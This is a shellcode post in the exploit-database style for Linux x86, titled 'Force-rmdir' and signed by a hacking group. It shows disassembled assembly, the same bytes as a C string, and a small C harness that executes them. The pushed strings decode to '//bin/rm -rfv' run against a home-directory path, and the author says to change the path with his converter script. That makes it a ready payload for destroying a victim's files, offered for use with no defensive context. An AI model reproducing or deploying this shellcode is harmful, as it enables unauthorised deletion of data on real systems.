Linux/x86 Force-rmdir

--- WE ARE BOMBERMANS ---
#Greetz : Bomberman(Leader)
#Author : B3mB4m
#Bomberman's owned this section BACK OFF !

/*Shellcode length depend file path.*/


#https://github.com/b3mb4m/Shellcode/blob/master/Auxiliary/convertstack.py
#Use my own stack converter that's will help you ;)


Disassembly of section .text:

08048060 <.text>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 6e 2f 72 6d       	push   $0x6d722f6e
 8048068:	68 2f 2f 62 69       	push   $0x69622f2f
 804806d:	89 e3                	mov    %esp,%ebx
 804806f:	50                   	push   %eax
 8048070:	68 2d 72 66 76       	push   $0x7666722d
 8048075:	89 e1                	mov    %esp,%ecx
 8048077:	50                   	push   %eax
 8048078:	68 bc 2f 71 65       	push   $0x65712fbc
 804807d:	68 bc 73 74 c3       	push   $0xc37473bc
 8048082:	68 61 73 61 c3       	push   $0xc3617361 ;File path
 8048087:	68 34 6d 2f 4d       	push   $0x4d2f6d34 ;Change it with converstack.py
 804808c:	68 62 33 6d 62       	push   $0x626d3362
 8048091:	68 6f 6d 65 2f       	push   $0x2f656d6f
 8048096:	68 2f 2f 2f 68       	push   $0x682f2f2f
 804809b:	89 e2                	mov    %esp,%edx
 804809d:	50                   	push   %eax
 804809e:	52                   	push   %edx
 804809f:	51                   	push   %ecx
 80480a0:	53                   	push   %ebx
 80480a1:	89 e7                	mov    %esp,%edi
 80480a3:	b0 0b                	mov    $0xb,%al
 80480a5:	89 f9                	mov    %edi,%ecx
 80480a7:	31 d2                	xor    %edx,%edx
 80480a9:	cd 80                	int    $0x80


#include <stdio.h>
#include <string.h>



char *shellcode = "\x31\xc0\x50\x68\x6e\x2f\x72\x6d\x68\x2f\x2f\x62"
"\x69\x89\xe3\x50\x68\x2d\x72\x66\x76\x89\xe1\x50\x68\xbc\x2f\x71\x65"
"\x68\xbc\x73\x74\xc3\x68\x61\x73\x61\xc3\x68\x34\x6d\x2f\x4d\x68\x62"
"\x33\x6d\x62\x68\x6f\x6d\x65\x2f\x68\x2f\x2f\x2f\x68\x89\xe2\x50\x52"
"\x51\x53\x89\xe7\xb0\x0b\x89\xf9\x31\xd2\xcd\x80";


int main(void){
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}
